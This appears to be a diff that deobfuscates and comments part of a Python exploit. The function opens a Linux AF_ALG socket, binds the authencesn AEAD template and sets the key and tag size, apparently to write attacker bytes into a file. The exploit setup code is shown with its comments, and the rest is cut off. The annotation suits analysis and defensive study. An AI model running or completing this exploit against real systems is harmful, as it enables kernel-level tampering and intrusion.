@@ -16,23 +16,27 @@ Parameters (f,t,c) --> (file,index,byteData)
 
 a = ALFSocket
 h = sockLevel
-v = v
+v = sockOptObj
 u = client
 _ = addr
 o = o
 i = i
 r,w = read, write
 n = n
-
 '''
 def c(file, index, byteData):
+    #Socket family=38 (AF_ALG), type=5 (SOCK_SEQPACKET) , protocol=0 (default)
     ALFSocket = socket.socket(38, 5, 0)
+    #Bind to authencesn AEAD template
     ALFSocket.bind(("aead",
                     "authencesn(hmac(sha256),cbc(aes))"))
-    sockLevel = 279
-    v = ALFSocket.setsockopt
-    v(sockLevel, 1, toBytes('0800010000000010'+'0'*64))
-    v(sockLevel, 5, None, 4)
+
+    sockLevel = 279 #Exploit uses socket level 279
+    sockOptObj = ALFSocket.setsockopt
+    #level=279, optname=1 (ALG_SET_KEY), optval=bytes (key for authencesn)
+    sockOptObj(sockLevel, 1, toBytes('0800010000000010'+'0'*64))
+    #level=279, optname=5 (ALG_SET_AEAD_AUTHSIZE), set to 4 byte tag
+    sockOptObj(sockLevel, 5, None, 4)
     
     client, addr = ALFSocket.accept()
     
